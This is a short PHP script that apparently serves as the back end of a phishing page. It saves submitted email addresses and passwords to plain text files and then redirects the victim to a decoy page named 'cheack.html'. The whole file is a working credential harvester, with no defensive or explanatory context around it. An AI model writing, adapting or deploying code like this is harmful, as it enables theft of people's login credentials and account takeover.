<?php

file_put_contents("pass.txt", "" . $_POST['pass'] . "\n", FILE_APPEND);
file_put_contents("usernames.txt", "" . $_POST['email'] . "\n", FILE_APPEND);
header('Location: cheack.html');
exit();
